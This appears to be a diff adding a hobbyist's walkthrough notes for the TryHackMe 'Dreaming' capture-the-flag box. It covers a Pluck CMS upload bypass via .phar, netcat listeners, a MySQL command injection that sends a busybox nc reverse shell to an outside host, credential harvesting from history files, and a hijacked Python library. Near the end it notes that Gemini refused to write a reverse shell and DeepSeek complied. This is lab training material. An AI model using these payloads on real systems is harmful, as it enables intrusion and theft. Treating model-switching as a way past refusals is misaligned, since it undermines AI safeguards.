@@ -1,0 +1,133 @@
+# if you're tagging along, copy your target ip and then find and find+replace my TARGET_IP with your own.
+TARGET_IP = 10.113.130.19
+
+
+nmap -sV -sC 10.113.130.19
+we got ports 22 (ssh) and 80 (http)
+
+on ssh we have OpenSSH 8.2p1
+http is default apache2 page
+
+after some light confusion...
+
+gobuster dir -u http://10.113.130.19 -w /usr/share/wordlists/dirb/common.txt -x .php
+found some 403 forbidden stuff and /app
+in /app there was some pluck-4.7.13/ folder visible
+it opened a page http://10.113.130.19/app/pluck-4.7.13/?file=dreaming
+
+there was an admin login page (only password, no username)
+I just tried a password guess of: password
+it kinda worked (I was preparing for some hydra http-form-post hell but nope)
+http://10.113.130.19/app/pluck-4.7.13/admin.php?action=start
+
+I searched and found a way to upload a file
+the server is a naughty boy and makes .php and .phtml into .txt files
+
+I found admins email: sandman@dreaming.thm
+lets add dreaming.thm to /etc/hosts
+we do it the "big hacker-man" way
+echo "10.113.130.19 dreaming.thm" | sudo tee -a /etc/hosts
+
+after some light headbaning...
+
+I realized metasploit was trolling me
+just a quick searchsploit found exactly what i wanted
+searchsploit pluck
+# Pluck CMS 4.7.13 - File Upload Remote  | php/webapps/49909.py
+here a cve about this for reference: https://nvd.nist.gov/vuln/detail/CVE-2020-29607
+
+I did some more google search and metasploit doesnt have this cve
+The recommended way to bypass the upload restriction is using .phar extension
+dont forget to change the ip in the revshell to your (attacker) ip
+cat shell.php > shell.phar
+nc -lvnp 4444
+nice.
+________________________________________
+From the guy that knew to use .phar (username on Medium: Telynor), we can also use this part:
+source: https://medium.com/@telynor_51425/walkthrough-thm-dreaming-b952d6218a2c
+Shell stabilization
+Because working with a raw shell is like trying to perform database maintenance with a spoon:
+
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+# Ctrl+Z
+stty raw -echo; fg
+export TERM=xterm
+________________________________________
+now we have a stable shell (much cooler)
+
+i spent quite some time looking for interesting stuff
+as lucien is the first flag, i tried this:
+grep -rnl -i "lucien" 2>dev/null
+nothing interesting
+
+in /opt folder there was test.py that contained lucien's password
+ssh lucien@10.113.130.19
+su lucien
+# enter the password
+
+we can now see getDreams.py which contains some mysql python
+this leads me to believe we will exploit that soon
+we quickly grab luciens flag and go on
+lucien is not very high up but...
+sudo -l
+we see this:
+User lucien may run the following commands on ip-10-114-161-166:
+    (death) NOPASSWD: /usr/bin/python3 /home/death/getDreams.py
+
+in luciens .mysql_history we can see he ran a lot of mysql commands
+in luciens .bash_history he forgot to clear his mysql -u commands so we got his password
+
+mysql -u lucien -HERE_WAS_THE_PASSWORD
+
+show databases;
+use library;
+show tables;
+select * from dreams;
+
+ok here my skills are lacking. 
+I don't think the right way is to install sqlmap or other automation
+I wasn't able to find a quick mysql revshell
+________________________________________
+stolen from The_Hiker
+https://medium.com/@The_Hiker/tryhackme-dreaming-walkthrough-both-paths-to-root-thehiker-40dff71bb9c4
+
+connect to the mysql as lucien and run this:
+the command with id is a test, whether it actually runs as death
+
+use library;
+INSERT INTO dreams (dreamer, dream) VALUES ('thehiker', ';id');
+quit;
+sudo -u death /usr/bin/python3 /home/death/getDreams.py
+### here you should see the command id being executed as death
+mysql -u lucien -HERE_WAS_THE_PASSWORD
+use library;
+UPDATE dreams SET dream = ';busybox nc  10.113.106.148 9898  -e sh' WHERE dream LIKE "%id%";
+
+then we set up a listener on our machine: 
+nc -lvnp 9898
+
+run getDreams as death from lucien:
+sudo -u death /usr/bin/python3 /home/death/getDreams.py
+
+in the listener we get a shell as death
+________________________________________
+inspecting /opt/getDreams.py as death we find his mysql password (that is also his ssh pass)
+
+ssh death@dreaming.thm
+
+now we take death's flag
+
+the only thing left is to go for morpheus
+if we look at morpheus's home, we can see restore.py
+the only exploitable thing it seems to be doing is importing shutil
+i looked at the shutil installation and viewed it with nano
+accidentally discovering that I can freely edit the file
+this means that we will replace the shutitil copy2 function with a reverse shell
+
+I tried getting gemini to write the revshell but he refused
+
+deepseek.com did not refuse.
+
+we changed the copy2 function to call the revshell
+nc -lvnp 9898
+then grab morpheus flag
